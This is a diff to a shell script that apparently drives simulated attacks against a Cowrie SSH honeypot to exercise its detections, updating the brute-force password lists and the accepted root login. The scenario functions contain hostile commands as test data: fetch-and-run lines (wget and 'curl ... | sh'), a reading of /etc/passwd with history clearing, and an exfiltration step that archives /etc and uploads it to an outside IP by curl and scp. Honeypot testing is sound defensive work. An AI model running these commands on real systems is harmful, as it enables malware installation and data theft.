@@ -120,7 +120,7 @@ scenario_brute_force() {
     step "SSH brute force against Cowrie (${TARGET}:${SSH_PORT})"
 
     local users=(root admin oracle test ubuntu postgres)
-    local passwords=(123456 password admin root toor)
+    local passwords=(123456 password admin root)   # all rejected for root in userdb.txt
 
     if ! have sshpass; then
         warn "sshpass not installed - using raw TCP connects instead."
@@ -263,7 +263,8 @@ scenario_telnet() {
 scenario_credential_attack() {
     step "Credential attack against Cowrie (${TARGET}:${SSH_PORT}) — brute then valid login"
 
-    local bad=(123 letmein qwerty hunter2)
+    # must match sensors/cowrie/userdb.txt: these four are the explicit root rejects
+    local bad=(root 123456 password admin)
     local n=0
     for p in "${bad[@]}"; do
         if have sshpass; then
@@ -277,8 +278,8 @@ scenario_credential_attack() {
         n=$((n + 1)); sleep 0.3
     done
     if have sshpass; then
-        note "valid login: root / (cowrie default)"
-        sshpass -p "root" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
+        note "valid login: root / hunter2 (accepted by userdb catch-all)"
+        sshpass -p "hunter2" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
             -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=5 \
             -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password \
             -o PubkeyAuthentication=no "root@${TARGET}" 'id; exit' >/dev/null 2>&1 || true
@@ -293,7 +294,7 @@ scenario_suspicious_command() {
         warn "sshpass not installed — cannot drive an interactive session."
         return 0
     fi
-    sshpass -p "root" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
+    sshpass -p "hunter2" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
         -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=6 \
         -o PreferredAuthentications=password -o PubkeyAuthentication=no \
         "root@${TARGET}" 'whoami; id; uname -a; cat /etc/passwd; crontab -l; history -c; exit' \
@@ -310,7 +311,7 @@ scenario_malware_download() {
         warn "sshpass not installed — cannot drive an interactive session."
         return 0
     fi
-    sshpass -p "root" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
+    sshpass -p "hunter2" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
         -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=6 \
         -o PreferredAuthentications=password -o PubkeyAuthentication=no \
         "root@${TARGET}" 'cd /tmp; wget http://185.99.1.7/bot.sh -O x.sh; chmod +x x.sh; curl http://malware.test/payload | sh; exit' \
@@ -359,7 +360,7 @@ scenario_web_attack() {
 scenario_exfil_sim() {
     step "Exfiltration-shaped commands on Cowrie (${TARGET}:${SSH_PORT})"
     have sshpass || { warn "sshpass not installed"; return 0; }
-    sshpass -p "root" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
+    sshpass -p "hunter2" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
         -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=6 \
         -o PreferredAuthentications=password -o PubkeyAuthentication=no \
         "root@${TARGET}" 'tar czf /tmp/loot.tgz /etc; curl -T /tmp/loot.tgz http://185.99.1.7/upload; scp /tmp/loot.tgz evil@185.99.1.7:/tmp/; exit' \
